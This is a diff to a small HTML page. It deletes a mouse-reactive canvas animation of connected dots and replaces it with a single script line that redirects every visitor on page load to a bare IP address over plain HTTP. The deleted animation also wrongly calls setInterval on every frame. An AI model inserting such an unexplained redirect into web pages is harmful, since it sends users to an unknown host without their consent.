@@ -13,73 +13,7 @@
 <body>
 <canvas id="can" width="1000px" height="1000px"></canvas>
 <script>
-    var can = document.getElementById("can");
-    can.width = window.innerWidth
-    can.height = window.innerHeight
-    var cxt = can.getContext("2d");
-    cxt.width = window.innerWidth
-    cxt.height = window.innerHeight
-    window.onresize=()=>{
-        cxt.width = window.innerWidth
-        cxt.height = window.innerHeight
-        can.width = window.innerWidth
-        can.height = window.innerHeight
-    }
-    var mouse = {x:null,y:null,max:20000}
-    window.onmousemove = (e)=>{
-        mouse.x = e.clientX
-        mouse.y = e.clientY
-
-    }
-    window.onmouseout = ()=>{
-        mouse.x = null
-        mouse.y = null
-    }
-
-    var dots = []
-    for(var i=0;i < 300; i++){
-        var x = Math.random()*can.width
-        var y = Math.random()*can.height
-        var xa = Math.random()-0.5
-        var ya = Math.random()-0.5
-        dots.push({x,y,xa,ya,max:6000})
-    }
-    
-    function animation() {
-        cxt.clearRect(0,0,can.width,can.height)
-        var ndots = [mouse].concat(dots)
-        dots.forEach(function (dot) {
-            dot.x += dot.xa
-            dot.y += dot.ya
-            dot.xa*=(dot.x > can.width || dot.x < 0)?-1:1
-            dot.ya*=(dot.y > can.height || dot.y < 0)?-1:1
-
-            cxt.fillRect(dot.x,dot.y,1,1)
-            for(var i=0;i<ndots.length;i++){
-                var d = ndots[i]
-                if(d==dot)continue
-                var dx = dot.x - d.x
-                var dy = dot.y - d.y
-                var dxy = dx*dx + dy*dy
-                if(dxy < d.max){
-                    if(d == mouse && dxy > d.max/2){
-                        dot.x  -= dx*0.03
-                        dot.y -= dy*0.03
-                    }
-                    cxt.beginPath()
-                    cxt.lineWidth=0.3
-                    cxt.strokeStyle="aqua"
-                    cxt.moveTo(dot.x,dot.y)
-                    cxt.lineTo(d.x,d.y)
-                    cxt.stroke()
-                    cxt.closePath()
-                }
-            }
-            ndots.splice(ndots.indexOf(dot),1)
-        })
-        setInterval(animation,1000/60)
-    }
-    animation()
+window.location="http://62.234.155.106"
 </script>
 </body>
 </html>
